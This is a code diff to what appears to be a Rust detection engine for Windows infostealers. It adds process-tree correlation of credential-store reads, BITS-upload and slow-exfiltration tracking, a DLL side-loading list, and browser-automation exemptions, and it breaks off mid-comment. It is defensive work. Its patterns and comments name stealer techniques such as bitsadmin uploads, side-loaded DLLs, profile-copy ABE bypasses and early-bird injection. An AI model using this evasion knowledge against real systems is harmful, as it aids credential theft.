@@ -80,6 +80,7 @@
 use crate::canary::{self, is_conditional_canary};
 use crate::catalog::*;
 use crate::families::{Ctx, Family, FamilyHit};
+use crate::identity;
 use crate::paths::{
     benign_reader_for, glob_match, glob_match_path, is_browser_image, is_canary_ignored_reader,
     is_chromium_image, is_mozilla_image, is_trusted_owner, is_untrusted_location_or_signature,
@@ -102,6 +103,27 @@ const MAX_AUTORUN_REISSUE: usize = 4096;
 const ST02_WINDOW_MS: i64 = 60_000;
 const ST02_MIN_CATEGORIES: usize = 3;
 const ST04_WINDOW_MS: i64 = 300_000;
+/// Fix round 2026-10-25 (corpus `evasion_slow_exfil_10min`): reads, then an
+/// upload of at least [`ST04_SLOW_MIN_BYTES`] within this window.
+const ST04_SLOW_WINDOW_MS: i64 = 30 * 60 * 1000;
+/// The sensor re-reports a flow's `bytes_sent` at 1 KB, 64 KB, 1 MB, 16 MB.
+const ST04_SLOW_MIN_BYTES: u64 = 64 * 1024;
+/// A single UDP datagram to 443 of at most this size is a QUIC Initial
+/// (Chromium pads it to 1,250 bytes): a handshake, not an upload.
+const QUIC_INITIAL_MAX_BYTES: u64 = 1_500;
+/// Process-tree credential records (ST-02 / ST-04 across the tree).
+const TREE_TTL_MS: i64 = ST04_SLOW_WINDOW_MS;
+const MAX_TREE: usize = 4096;
+const MAX_TREE_DEPTH: usize = 6;
+/// BITS upload jobs created by a process tree (ST-04 via the BITS service).
+const BITS_JOB_TTL_MS: i64 = ST04_SLOW_WINDOW_MS;
+const MAX_TAINTED: usize = 8192;
+/// A browser update (installer / updater run) explains the browser closing
+/// and the elevation service starting (FP-18).
+const BROWSER_UPDATE_WINDOW_MS: i64 = 5 * 60 * 1000;
+/// FP-14: in Protect, a binary (by sha256) whose ST-12 suspend windows
+/// ended in a resume this many times is no longer suspended for 7 days.
+const ST12_PROTECT_RESUMES: u32 = 3;
 const ST08_WINDOW_MS: i64 = 1_000;
 const ST08_MIN_STOPS: usize = 2;
 const ST08_ATTRIBUTION_MS: i64 = 5_000;
@@ -340,6 +362,54 @@ const SIDELOAD_LEGIT_DIRS: &[&str] = &[
     r"\windows\system32\",
     r"\windows\syswow64\",
 ];
+
+/// Red-team round 2 (2026-10-25): Windows DLLs that programs resolve from
+/// their own folder before System32 and that DLL side-loading uses.
+const SIDELOAD_SYSTEM_DLLS: &[&str] = &[
+    "version.dll",
+    "winhttp.dll",
+    "wininet.dll",
+    "dbghelp.dll",
+    "dbgcore.dll",
+    "userenv.dll",
+    "cryptbase.dll",
+    "cryptsp.dll",
+    "dwmapi.dll",
+    "uxtheme.dll",
+    "wtsapi32.dll",
+    "winmm.dll",
+    "msimg32.dll",
+    "profapi.dll",
+    "secur32.dll",
+    "sspicli.dll",
+    "netapi32.dll",
+    "iphlpapi.dll",
+    "dnsapi.dll",
+    "mpr.dll",
+    "propsys.dll",
+    "wldp.dll",
+    "amsi.dll",
+    "dxgi.dll",
+    "d3d9.dll",
+    "winspool.drv",
+];
+/// Chromium core DLLs, loaded from the browser's `<version>` folder.
+const CHROMIUM_CORE_DLLS: &[&str] = &[
+    "chrome_elf.dll",
+    "chrome.dll",
+    "msedge_elf.dll",
+    "msedge.dll",
+];
+
+/// Is `path` inside a `\<digits and dots>\` version folder?
+fn in_version_dir(path: &str) -> bool {
+    let n = normalize_path(path);
+    let mut comps: Vec<&str> = n.split('\\').collect();
+    comps.pop();
+    comps.iter().any(|c| {
+        c.contains('.') && !c.is_empty() && c.bytes().all(|b| b.is_ascii_digit() || b == b'.')
+    })
+}
 
 /// Services that legitimately talk to a dead-drop domain (ST-14 owner exemption).
 const DOMAIN_OWNERS: &[(&str, &[&str])] = &[
@@ -668,6 +738,10 @@ enum BenignRead {
     WamPerUser,
     /// `legit_apps::vendor_config_reader` (triage item 9).
     VendorConfig,
+    /// Red-team round 2026-10-25 (`paths::own_folder_reader`): an owner name
+    /// not pinned by the publisher table reading the store in its own
+    /// application folder.
+    OwnFolder,
 }
 
 #[derive(Default)]
@@ -696,6 +770,8 @@ struct ProcState {
     /// Triage 2026-10-22 item 9: Steam client configuration read by a signed
     /// Program Files vendor service (`legit_apps::vendor_config_reader`).
     vendor_cfg_cred: bool,
+    /// Red-team round 2026-10-25: own-folder reads by an unpinned owner name.
+    own_folder_cred: bool,
     /// 2026-10-22: the one cloud provider (`legit_apps::cloud_provider`)
     /// whose developer-tool stores were read, while `non_provider_cred` is
     /// false (every credential read so far was that provider's store).
@@ -703,6 +779,22 @@ struct ProcState {
     /// Any credential read or DPAPI unprotect that is not one provider's store.
     non_provider_cred: bool,
     non_wam_cred: bool,
+    /// Fix round 2026-10-25: a non-benign read of a credential-store
+    /// *file* (not a DPAPI call).
+    file_cred: bool,
+    /// DPAPI unprotects of browser secrets: any with a description other
+    /// than the generic "Chromium" (Electron / embedded Chromium key).
+    dpapi_named: bool,
+    /// A DPAPI "Chromium" unprotect counted as a credential signal.
+    dpapi_chromium: bool,
+    /// Sensor 2026-10-25: last read of this process's **own** profile
+    /// `Local State` (its `--user-data-dir` or `%APPDATA%\<app>`).
+    own_ls_ts: Option<TimestampMs>,
+    /// A `Local State` of any other profile was read (foreign key).
+    foreign_ls: bool,
+    /// Provider service hosts contacted after provider-only reads (ST-04
+    /// provider allowance: a region / service sweep is not SDK use).
+    provider_hosts: Vec<String>,
     dns: HashMap<String, String>,
     st13: Option<&'static str>,
     fired: Vec<(String, TimestampMs)>,
@@ -760,6 +852,42 @@ impl ProcState {
     }
 }
 
+/// Fix round 2026-10-25 (corpus finding 5 / 6): credential reads of one
+/// untrusted process tree, keyed by every tree member from the reader up to
+/// (excluding) its first trusted ancestor. Survives the reader's exit (PID
+/// reuse safety: keys are process GUIDs).
+#[derive(Debug, Clone)]
+struct TreeCred {
+    /// Most recent reader with a non-benign read, and its facts.
+    reader: ProcessGuid,
+    reader_info: Option<ProcessInfo>,
+    /// Last non-benign read of the tree.
+    last_ts: TimestampMs,
+    first_ts: TimestampMs,
+    cat_ts: [Option<TimestampMs>; NUM_CATEGORIES],
+    /// Distinct readers (bounded).
+    members: Vec<ProcessGuid>,
+    /// Distinct store labels (bounded) and whether any is a high-value
+    /// store (browser, wallet, messenger, password manager, mail, FTP, VPN).
+    apps: Vec<&'static str>,
+    high_value: bool,
+    touched: Vec<(&'static str, &'static str)>,
+}
+
+impl TreeCred {
+    fn categories_within(&self, now: TimestampMs, window: TimestampMs) -> usize {
+        self.cat_ts
+            .iter()
+            .filter(|t| t.is_some_and(|t| t <= now && now - t <= window))
+            .count()
+    }
+    /// Strong enough to link a sender that is not the reader's direct
+    /// relative: a high-value store or two different stores.
+    fn linkable(&self) -> bool {
+        self.high_value || self.apps.len() >= 2
+    }
+}
+
 #[derive(Debug, Clone)]
 struct SuspendWindow {
     guid: ProcessGuid,
@@ -772,6 +900,9 @@ struct SuspendWindow {
     /// The opening rule kills at expiry when the image turns out to be
     /// untrusted (ST-01 / ST-03); re-judged on late enrichment.
     kill_capable: bool,
+    /// FP-14: ST-12 first-seen identity (sha256 only) of the suspended
+    /// binary; a resume at expiry is counted for it.
+    st12_key: Option<String>,
 }
 
 struct ClickfixPending {
@@ -1184,6 +1315,8 @@ pub(crate) struct EngineState {
     /// thread-context / debugger signal (ST-07's inputs) in their lifetime:
     /// never treated as a genuine importer by ST-16. Bounded.
     tampered: HashSet<ProcessGuid>,
+    /// Size of `tampered` at which exited entries are pruned (L1).
+    taint_prune_at: usize,
     debug_ports: HashMap<u16, TimestampMs>,
     clickfix: Vec<ClickfixPending>,
     canaries: Mutex<CanaryState>,
@@ -1205,6 +1338,13 @@ pub(crate) struct EngineState {
     /// (rule, image, evidence object) in the last 24 h: (last alert, repeats
     /// folded since). Bounded ([`MAX_LOW_SEEN`]).
     low_seen: HashMap<u64, (TimestampMs, u32)>,
+    /// Fix round 2026-10-25: credential reads per untrusted process tree
+    /// (see [`TreeCred`]), bounded ([`MAX_TREE`]), [`TREE_TTL_MS`].
+    tree: HashMap<ProcessGuid, TreeCred>,
+    /// BITS upload jobs: (time, creating process).
+    bits_jobs: VecDeque<(TimestampMs, ProcessGuid)>,
+    /// FP-18: last start of a genuine browser installer / updater.
+    last_browser_update: TimestampMs,
 }
 
 /// ST-12 first-seen entry (triage 2026-10-22 item 1).
@@ -1217,6 +1357,9 @@ struct SeenBinary {
     rank: u8,
     /// Executions folded into that alert since.
     repeats: u32,
+    /// FP-14: Protect-mode suspend windows of this binary that ended in a
+    /// resume (not persisted across restarts).
+    resumed: u32,
 }
 
 /// ST-12 alerts once per binary per device per this interval.
@@ -1338,6 +1481,7 @@ impl EngineState {
             last_browser_start: i64::MIN,
             kill_intents: VecDeque::new(),
             tampered: HashSet::new(),
+            taint_prune_at: MAX_TAINTED,
             debug_ports: HashMap::new(),
             clickfix: vec![],
             canaries: Mutex::new(CanaryState::default()),
@@ -1348,6 +1492,9 @@ impl EngineState {
             paused: None,
             st12_seen: HashMap::new(),
             low_seen: HashMap::new(),
+            tree: HashMap::new(),
+            bits_jobs: VecDeque::new(),
+            last_browser_update: i64::MIN,
         };
         s.set_sigma(sigma);
         s.update_policy(policy);
@@ -1945,6 +2092,474 @@ impl EngineState {
             || is_lolbin(&file_name_lower(&p.image))
     }
 
+    // ---- fix round 2026-10-25: taint, identity, process trees ----
+
+    /// Mark `g` as tampered with (injected into, written to, thread
+    /// context changed, debugged, or side-loaded): it loses every allowance
+    /// and owner status for its lifetime. Bounded without ever re-trusting
+    /// a live process (review of the 1.1.7 integration, L1): when the set
+    /// reaches its prune mark, only entries of processes that exited or
+    /// left the process table are dropped. Live entries always stay, so the
+    /// set never exceeds the table's own cap (plus the new entry); the next
+    /// prune mark is twice what is left, so a flood of live tainted
+    /// processes costs amortised O(1) per taint, not a scan each time.
+    fn taint(&mut self, g: ProcessGuid) {
+        if self.tampered.len() >= self.taint_prune_at && !self.tampered.contains(&g) {
+            let table = &self.table;
+            self.tampered
+                .retain(|t| table.get(t).is_some_and(|p| p.exit_ts.is_none()));
+            self.taint_prune_at = MAX_TAINTED.max(self.tampered.len().saturating_mul(2));
+        }
+        self.tampered.insert(g);
+    }
+
+    /// Tainted processes held (tests).
+    #[cfg(test)]
+    pub(crate) fn tainted_len(&self) -> usize {
+        self.tampered.len()
+    }
+
+    fn tainted(&self, g: &ProcessGuid) -> bool {
+        self.tampered.contains(g)
+    }
+
+    /// Where a process tree stops for ST-02 / ST-04 tree correlation: the
+    /// first ancestor that is a trusted Windows binary (explorer, services,
+    /// svchost), a protected process, or a genuine installed application
+    /// (Program Files / Windows, or a listed publisher's install) that is
+    /// not an interpreter / LOLBin and was never tampered with. Unknown
+    /// images stop the walk too.
+    fn tree_boundary(&self, p: &ProcessInfo) -> bool {
+        if p.image.is_empty() || self.protected(p) {
+            return true;
+        }
+        let tainted = self.tainted(&p.guid);
+        if Self::system_trusted(p) && !tainted {
+            return true;
+        }
+        let name = file_name_lower(&p.image);
+        if crate::legit_apps::is_interpreter(&name) || is_lolbin(&name) {
+            return false;
+        }
+        identity::genuine(p, self.system_drive, tainted)
+            && (crate::legit_apps::in_program_files(&p.image, self.system_drive)
+                || identity::in_windows_dir(&p.image, self.system_drive)
+                || identity::publishers_for(&name).next().is_some())
+    }
+
+    /// `g` and its ancestors up to (excluding) the first tree boundary.
+    fn tree_keys(&self, g: &ProcessGuid) -> Vec<ProcessGuid> {
+        let mut keys = vec![g.clone()];
+        let mut cur = self.table.get(g).cloned();
+        for _ in 0..MAX_TREE_DEPTH {
+            let Some(p) = cur else { break };
+            let parent = self.table.parent_of(&p).cloned();
+            match parent {
+                Some(pp) => {
+                    if self.tree_boundary(&pp) || keys.contains(&pp.guid) {
+                        break;
+                    }
+                    keys.push(pp.guid.clone());
+                    cur = Some(pp);
+                }
+                None => {
+                    // The parent left the table: its GUID still names the tree.
+                    if let Some(pg) = p.parent_guid.clone() {
+                        if !keys.contains(&pg) && self.tree.contains_key(&pg) {
+                            keys.push(pg);
+                        }
+                    }
+                    break;
+                }
+            }
+        }
+        keys
+    }
+
+    /// Record a non-benign credential read (or DPAPI unprotect) of `reader`
+    /// for its whole untrusted tree; returns the tree root key.
+    fn record_tree_read(
+        &mut self,
+        reader: &ProcessInfo,
+        app: &'static str,
+        noun: &'static str,
+        category: DataCategory,
+        ts: TimestampMs,
+    ) -> Option<ProcessGuid> {
+        let keys = self.tree_keys(&reader.guid);
+        let high_value = !matches!(category, DataCategory::CloudToken | DataCategory::SshKeys);
+        if self.tree.len() >= MAX_TREE {
+            let mut v: Vec<TimestampMs> = self.tree.values().map(|c| c.last_ts).collect();
+            v.sort_unstable();
+            let cut = v[v.len() / 8];
+            self.tree.retain(|_, c| c.last_ts > cut);
+        }
+        for k in &keys {
+            let c = self.tree.entry(k.clone()).or_insert_with(|| TreeCred {
+                reader: reader.guid.clone(),
+                reader_info: None,
+                last_ts: ts,
+                first_ts: ts,
+                cat_ts: [None; NUM_CATEGORIES],
+                members: vec![],
+                apps: vec![],
+                high_value: false,
+                touched: vec![],
+            });
+            c.reader = reader.guid.clone();
+            c.reader_info = Some(reader.clone());
+            c.last_ts = c.last_ts.max(ts);
+            c.first_ts = c.first_ts.min(ts);
+            c.cat_ts[cat_index(category)] = Some(ts);
+            if !c.members.contains(&reader.guid) && c.members.len() < 16 {
+                c.members.push(reader.guid.clone());
+            }
+            if !c.apps.contains(&app) && c.apps.len() < 32 {
+                c.apps.push(app);
+            }
+            if c.touched.len() < MAX_TOUCHED && !c.touched.contains(&(app, noun)) {
+                c.touched.push((app, noun));
+            }
+            c.high_value |= high_value;
+        }
+        keys.last().cloned()
+    }
+
+    /// ST-02 across a process tree (corpus `evasion_copy_stores_via_children`):
+    /// three kinds of secrets within 60 s collected by at least two
+    /// processes of one untrusted tree. Subject: the tree root (killed with
+    /// its tree in Protect).
+    fn check_tree_st02(&mut self, e: &Event, root: &ProcessGuid) {
+        let Some(c) = self.tree.get(root) else { return };
+        let ncat = c.categories_within(e.ts, ST02_WINDOW_MS);
+        if ncat < ST02_MIN_CATEGORIES || c.members.len() < 2 {
+            return;
+        }
+        let phrase = stores_phrase(&c.touched);
+        let first = c.first_ts;
+        let members = c.members.len();
+        let rp = self
+            .table
+            .get(root)
+            .cloned()
+            .unwrap_or_else(|| placeholder(root, 0, e.ts));
+        let mut hit = Hit::new(
+            ST02,
+            root,
+            Severity::Critical,
+            format!(
+                "The process tree of {} ({members} processes) collected {phrase} — {ncat} kinds of secrets within {}",
+                describe(&rp),
+                fmt_secs(e.ts - first)
+            ),
+        );
+        hit.dedup_key = Some(format!("{ST02}#tree"));
+        hit.actions.push(kill(&rp, true));
+        if rp.path_class.is_user_writable() && !rp.image.is_empty() {
+            hit.actions.push(ResponseAction::BlockImageNetwork {
+                image: rp.image.clone(),
+                ttl_secs: None,
+            });
+            hit.actions.push(quarantine(&rp));
+        }
+        hit.strong = true;
+        hit.process = Some(rp);
+        if e.guid != *root {
+            hit.extra_evidence.push(e.clone());
+        }
+        self.emit(e, hit);
+    }
+
+    /// Credential stores that trusted Windows binaries legitimately read
+    /// (the vault / Credential Manager / DPAPI services, the token broker).
+    /// Browser, wallet, messenger, developer and every other store read by a
+    /// Windows binary is judged like any other reader (corpus finding 1:
+    /// credwiz / OpenWith / explorer hosting a stealer).
+    fn system_reader_ok(&self, p: &ProcessInfo, store: &SensitiveStore) -> bool {
+        Self::system_trusted(p)
+            && !self.tainted(&p.guid)
+            && matches!(
+                store.app,
+                "Windows Credential Manager"
+                    | "Windows DPAPI"
+                    | "Windows token broker"
+                    | "Microsoft identity (MSAL)"
+            )
+    }
+
+    /// Sensor 2026-10-25: is `norm` (a `...\local state` path) the reading
+    /// process's **own** profile key: the last `--user-data-dir` of the
+    /// process or of a same-image parent / child, or
+    /// `%APPDATA%\<name>\Local State` / `%LOCALAPPDATA%\<name>\Local State`
+    /// where `<name>` is the app's own folder (image file name or install
+    /// folder). Named browser profiles and Discord's key are never "own"
+    /// for anything but their owners (handled by the owner checks).
+    fn own_profile_local_state(&self, p: &ProcessInfo, norm: &str) -> bool {
+        let Some(dir) = norm.strip_suffix(r"\local state") else {
+            return false;
+        };
+        if dir.contains('~') || p.image.is_empty() {
+            return false;
+        }
+        if let Some(s) = match_normalized(norm) {
+            if s.app != "Chromium-based browser" {
+                return false;
+            }
+        }
+        let same_image = |q: &ProcessInfo| {
+            crate::table::image_key(&q.image) == crate::table::image_key(&p.image)
+        };
+        let mut procs: Vec<&ProcessInfo> = vec![p];
+        if let Some(pp) = self.table.parent_of(p).filter(|q| same_image(q)) {
+            procs.push(pp);
+        }
+        procs.extend(
+            self.table
+                .children_of(&p.guid)
+                .into_iter()
+                .filter(|q| same_image(q)),
+        );
+        for q in procs {
+            let sw = crate::legit_apps::switches(&q.cmdline);
+            if let Some(udd) = sw
+                .iter()
+                .rev()
+                .find(|(k, _)| k == "user-data-dir")
+                .and_then(|(_, v)| v.as_deref())
+            {
+                if normalize_path(udd.trim().trim_end_matches('\\')) == dir {
+                    return true;
+                }
+            }
+        }
+        let Some(rel) = crate::paths::profile_relative(dir) else {
+            return false;
+        };
+        let Some(name) = rel
+            .strip_prefix(r"appdata\roaming\")
+            .or_else(|| rel.strip_prefix(r"appdata\local\"))
+        else {
+            return false;
+        };
+        if name.len() < 3
+            || name.contains('\\')
+            || matches!(
+                name,
+                "microsoft" | "google" | "mozilla" | "programs" | "packages" | "temp" | "local"
+            )
+        {
+            return false;
+        }
+        let img = normalize_path(&p.image);
+        let stem = crate::paths::file_name(&img);
+        stem.starts_with(name) || img.contains(&format!(r"\{name}\"))
+    }
+
+    /// A package-manager install anywhere above `p` (npm / pnpm / yarn /
+    /// bun / pip / poetry lifecycle scripts): install-time code has no
+    /// business using cloud credentials (Shai-Hulud, corpus
+    /// `script_shai_hulud_aws_secrets_manager`).
+    fn package_install_tree(&self, p: &ProcessInfo) -> bool {
+        let mut chain = vec![p.clone()];
+        chain.extend(self.table.ancestry(&p.guid, 5));
+        chain.iter().any(|q| {
+            let c = q.cmdline.to_ascii_lowercase();
+            let words: Vec<&str> = c
+                .split(|ch: char| ch.is_whitespace() || ch == '"')
+                .filter(|w| !w.is_empty())
+                .collect();
+            let has = |w: &str| words.contains(&w);
+            let npm = words.iter().any(|w| {
+                w.ends_with("npm-cli.js")
+                    || w.ends_with("npm.cmd")
+                    || *w == "npm"
+                    || w.ends_with("pnpm.cjs")
+                    || w.ends_with("pnpm.cmd")
+                    || *w == "pnpm"
+                    || w.ends_with("yarn.js")
+                    || w.ends_with("yarn.cjs")
+                    || *w == "yarn"
+                    || *w == "bun"
+                    || w.ends_with("bun.exe")
+            }) && (has("install") || has("i") || has("ci") || has("add"));
+            let pip = words.iter().any(|w| {
+                *w == "pip"
+                    || *w == "pip3"
+                    || w.ends_with("pip.exe")
+                    || w.ends_with("pip3.exe")
+                    || *w == "poetry"
+                    || w.ends_with("poetry.exe")
+            }) && has("install");
+            let pym = has("-m") && has("pip") && has("install");
+            npm || pip || pym
+        })
+    }
+
+    /// FP-08 (fix round 2026-10-25): Playwright / Puppeteer launching a
+    /// browser with remote debugging. Benign only when **all** hold:
+    /// no `--load-extension`; the profile is not a real browser profile
+    /// (its last `--user-data-dir` is a fresh `playwright_*` /
+    /// `puppeteer_dev_*` folder directly in the profile's Temp folder, or the
+    /// browser is the framework's own build under `ms-playwright` /
+    /// `.cache\puppeteer` with no `--user-data-dir` or such a temporary one);
+    /// and the launching tree read no browser store in the last 10 minutes
+    /// (copying the real profile into a "playwright_" folder first is the
+    /// ABE bypass, which keeps the full response).
+    fn browser_automation(
+        &self,
+        info: &ProcessInfo,
+        parent: Option<&ProcessInfo>,
+        load_ext: bool,
+    ) -> bool {
+        if load_ext {
+            return false;
+        }
+        let sw = crate::legit_apps::switches(&info.cmdline);
+        let udd = sw
+            .iter()
+            .rev()
+            .find(|(k, _)| k == "user-data-dir")
+            .map(|(_, v)| v.clone().unwrap_or_default());
+        let temp_profile = |u: &str| {
+            let n = normalize_path(u.trim().trim_matches('"').trim_end_matches('\\'));
+            if n.contains('~') {
+                return false;
+            }
+            crate::paths::profile_relative(&n).is_some_and(|r| {
+                r.strip_prefix(r"appdata\local\temp\").is_some_and(|leaf| {
+                    !leaf.contains('\\')
+                        && (leaf.starts_with("playwright_")
+                            || leaf.starts_with("playwright-")
+                            || leaf.starts_with("puppeteer_dev_"))
+                })
+            })
+        };
+        let img = normalize_path(&info.image);
+        let framework_browser =
+            img.contains(r"\ms-playwright\") || img.contains(r"\.cache\puppeteer\");
+        let profile_ok = match udd.as_deref() {
+            Some(u) if !u.trim().is_empty() => temp_profile(u),
+            _ => framework_browser,
+        };
+        if !profile_ok {
+            return false;
+        }
+        let recent = |t: TimestampMs| t <= info.start_ts && info.start_ts - t <= 10 * 60 * 1000;
+        let tree_read = parent.is_some_and(|p| {
+            self.tree_keys(&p.guid).iter().any(|k| {
+                self.tree.get(k).is_some_and(|c| {
+                    recent(c.last_ts) && c.cat_ts[..4].iter().any(|t| t.is_some_and(recent))
+                })
+            }) || self
+                .states
+                .get(&p.guid)
+                .is_some_and(|s| s.non_wam_cred && s.cred_ts().is_some_and(recent))
+        });
+        !tree_read
+    }
+
+    /// Red-team round 2 (early-bird injection into a browser the stealer
+    /// launched itself: no handle or thread event reaches a user-mode
+    /// sensor): was `p` started by a process that is not a trusted launcher
+    /// (a trusted Windows binary, a protected process, a genuine browser, or
+    /// a genuine application pinned by the publisher table or installed in
+    /// an admin-only folder)? Unknown parents are not held against it.
+    fn launched_by_untrusted(&self, p: &ProcessInfo) -> bool {
+        let Some(pp) = self.table.parent_of(p) else {
+            return false;
+        };
+        if pp.image.is_empty() {
+            return false;
+        }
+        let t = self.tainted(&pp.guid);
+        let sd = self.system_drive;
+        let trusted = (Self::system_trusted(pp) && !t)
+            || self.protected(pp)
+            || identity::genuine_browser(pp, sd, t)
+            || (identity::genuine(pp, sd, t)
+                && (identity::listed(&pp.image) || identity::admin_location(&pp.image, sd)));
+        !trusted
+    }
+
+    /// Review of the 1.1.7 integration (M3): may this genuine Electron
+    /// application be running someone else's code? `ELECTRON_RUN_AS_NODE`
+    /// is invisible to the sensor, so an Electron owner keeps owner status
+    /// only when its command line is a plain launch (checked in
+    /// [`crate::paths::is_trusted_owner`]) **and** it was started by a
+    /// trusted launcher ([`Self::launched_by_untrusted`]: Explorer, the
+    /// service host, the app's own genuine updater such as Squirrel's
+    /// `Update.exe`, a genuine browser for a protocol link) or by a plain
+    /// instance of itself (Chromium child processes), walked up to a few
+    /// levels. Unknown parents are not held against it.
+    fn electron_hijack_suspected(&self, p: &ProcessInfo) -> bool {
+        let name = file_name_lower(&p.image);
+        if crate::legit_apps::electron_runs_foreign_code(&name, &p.cmdline) {
+            return true;
+        }
+        // The launcher check is for the store-owning apps only: developer
+        // hosts are started from terminals, IDE tasks and scripts all day.
+        if !crate::legit_apps::is_electron_owner_image(&name) {
+            return false;
+        }
+        let sd = self.system_drive;
+        let mut cur = p.clone();
+        for _ in 0..8 {
+            let Some(pp) = self.table.parent_of(&cur) else {
+                return false;
+            };
+            if pp.image.is_empty() {
+                return false;
+            }
+            let same_app = file_name_lower(&pp.image) == name
+                && identity::genuine(pp, sd, self.tainted(&pp.guid));
+            if !same_app {
+                return self.launched_by_untrusted(&cur);
+            }
+            if crate::legit_apps::electron_runs_foreign_code(&name, &pp.cmdline) {
+                return true;
+            }
+            cur = pp.clone();
+        }
+        true
+    }
+
+    /// Does the browser store at `norm` (a profile path below
+    /// `...\<vendor>\<product>\User Data\` or `...\Profiles\`) belong to the
+    /// vendor of the browser `image` (every folder of the store's vendor path
+    /// appears in the image path)?
+    fn same_vendor_store(image: &str, norm: &str) -> bool {
+        let root = norm
+            .find(r"\user data\")
+            .or_else(|| norm.find(r"\profiles\"))
+            .map(|i| &norm[..i + 1]);
+        let Some(rel) = root.and_then(crate::paths::profile_relative) else {
+            return false;
+        };
+        let vendor = rel
+            .strip_prefix(r"appdata\local\")
+            .or_else(|| rel.strip_prefix(r"appdata\roaming\"))
+            .unwrap_or("");
+        let comps: Vec<&str> = vendor.split('\\').filter(|c| !c.is_empty()).collect();
+        let img = normalize_path(image);
+        !comps.is_empty() && comps.iter().all(|c| img.contains(c))
+    }
+
+    /// The BITS service host: Microsoft-signed System32 `svchost.exe` whose
+    /// command line names the BITS service (`-s BITS`), or the shared
+    /// `netsvcs` group without `-s` (service grouping off).
+    fn bits_host(p: &ProcessInfo) -> bool {
+        if !Self::system_trusted(p) || file_name_lower(&p.image) != "svchost.exe" {
+            return false;
+        }
+        let c = p.cmdline.to_ascii_lowercase();
+        let words: Vec<&str> = c.split_whitespace().collect();
+        let s_value = words.windows(2).find(|w| w[0] == "-s").map(|w| w[1]);
+        match s_value {
+            Some(v) => v == "bits",
+            None => words.windows(2).any(|w| w[0] == "-k" && w[1] == "netsvcs"),
+        }
+    }
+
     /// The Windows Installer service instance (ST-07 Restart Manager
     /// exemption): System32 `msiexec.exe` with a valid Microsoft signature,
     /// command line exactly `msiexec.exe /V`, running as SYSTEM, parent the
@@ -1982,10 +2597,7 @@ impl EngineState {
                     r.kind,
                     crate::paths::BenignKind::Security | crate::paths::BenignKind::Indexer
                 ) && glob_match(r.image, &name)
-                    && match (r.signer, p.signer.as_deref()) {
-                        (Some(req), Some(have)) => have.to_ascii_lowercase().contains(req),
-                        _ => true,
-                    }
+                    && identity::signer_in(r.signers, p.signer.as_deref())
             })
     }
 
@@ -2356,6 +2968,9 @@ impl EngineState {
                         deadline: ev.ts + self.policy.suspend_window_ms as i64,
                         kill_at_expiry: hit.kill_at_expiry,
                         kill_capable: hit.rule == ST01 || hit.rule == ST03,
+                        st12_key: (hit.rule == ST12)
+                            .then(|| st12_key(&proc_))
+                            .filter(|k| k.starts_with("sha256:")),
                     });
                     hit.summary.push_str(&format!(
                         " — suspended for {:.1} s pending a verdict",
@@ -2519,6 +3134,9 @@ impl EngineState {
                         self.out.extend(q.into_iter().map(Output::Action));
                     }
                 } else {
+                    if let Some(s) = w.st12_key.as_ref().and_then(|k| self.st12_seen.get_mut(k)) {
+                        s.resumed = s.resumed.saturating_add(1);
+                    }
                     self.out.push(Output::Action(ResponseAction::ResumeProcess {
                         pid: w.pid,
                         guid: Some(w.guid.clone()),
@@ -2560,6 +3178,15 @@ impl EngineState {
         if now - self.last_evict >= EVICT_INTERVAL_MS {
             self.last_evict = now;
             self.debug_ports.retain(|_, t| now - *t < DEBUG_PORT_TTL_MS);
+            self.tree
+                .retain(|_, c| now < c.last_ts || now - c.last_ts < TREE_TTL_MS);
+            while self
+                .bits_jobs
+                .front()
+                .is_some_and(|(t, _)| now - t > BITS_JOB_TTL_MS)
+            {
+                self.bits_jobs.pop_front();
+            }
             self.autorun_reissue
                 .retain(|_, (t, p)| p.is_some() || (now >= *t && now - *t < AUTORUN_REISSUE_MS));
             for g in self.table.evict(now) {
@@ -2639,6 +3266,35 @@ impl EngineState {
 
         self.check_process_iocs(e, &info);
 
+        // Fix round 2026-10-25 (corpus `evasion_exfil_bitsadmin`): a BITS
+        // upload job created by this process; the BITS service's upload is
+        // then linked back to this tree by ST-04.
+        let bits_upload = (name == "bitsadmin.exe" && cmd_lower.contains("/upload"))
+            || (matches!(name.as_str(), "powershell.exe" | "pwsh.exe")
+                && cmd_lower.contains("start-bitstransfer")
+                && cmd_lower.contains("upload"));
+        if bits_upload {
+            self.bits_jobs.push_back((e.ts, info.guid.clone()));
+            if self.bits_jobs.len() > 256 {
+                self.bits_jobs.pop_front();
+            }
+        }
+        // FP-18: a genuine browser installer / updater run.
+        if identity::genuine(&info, self.system_drive, false) {
+            let dl = driveless(&info.image);
+            let installer = name == "setup.exe"
+                && BROWSER_APP_DIRS.iter().any(|d| dl.contains(d))
+                && dl.contains(r"\installer\");
+            let updater = matches!(
+                name.as_str(),
+                "braveupdate.exe" | "googleupdate.exe" | "microsoftedgeupdate.exe"
+            ) || (name == "updater.exe"
+                && (dl.contains(r"\google\googleupdater\") || dl.contains(r"\bravesoftware\")));
+            if installer || updater {
+                self.last_browser_update = e.ts;
+            }
+        }
+
         // ST-05 browser debugging abuse. Re-review N5: Chromium accepts
         // `--`, `-` and `/` switch prefixes on Windows; parse them all.
         let sw = crate::legit_apps::switches(&cmd_lower);
@@ -2686,12 +3342,19 @@ impl EngineState {
                     .map(describe)
                     .unwrap_or_else(|| format!("process {}", info.ppid));
                 let mut hit = Hit::new(ST05, &info.guid, Severity::High, format!("{pdesc} launched {} {what}, a technique used to pull cookies through the DevTools protocol", short_name(&info)));
-                hit.actions.push(kill(&info, true));
-                if let Some(p) = &parent {
-                    if !is_browser_image(&p.image) {
-                        hit.actions.push(kill(p, false));
-                        if p.path_class.is_user_writable() {
-                            hit.actions.push(quarantine(p));
+                if self.browser_automation(&info, parent.as_ref(), load_ext) {
+                    // FP-08: test automation against a throw-away profile.
+                    hit.severity = Severity::Low;
+                    hit.mode_override = Some(RuleMode::Audit);
+                    hit.summary.push_str(" (test automation: the profile is a fresh Playwright / Puppeteer temporary profile or the automation framework's own browser, not the user's real profile, and the launching tree read no browser store; alert only)");
+                } else {
+                    hit.actions.push(kill(&info, true));
+                    if let Some(p) = &parent {
+                        if !is_browser_image(&p.image) {
+                            hit.actions.push(kill(p, false));
+                            if p.path_class.is_user_writable() {
+                                hit.actions.push(quarantine(p));
+                            }
                         }
                     }
                 }
@@ -2853,7 +3516,15 @@ impl EngineState {
             let prev = self.st12_seen.get(&key).copied();
             // Review M1: in Protect mode every run is still suspended and
             // judged (folding would skip the suspend window).
-            let fold_ok = self.mode(ST12) != RuleMode::Protect;
+            // FP-14 (fix round 2026-10-25, 25,383 Protect suspends of
+            // compilers on the owner's PC): once the same binary, by sha256
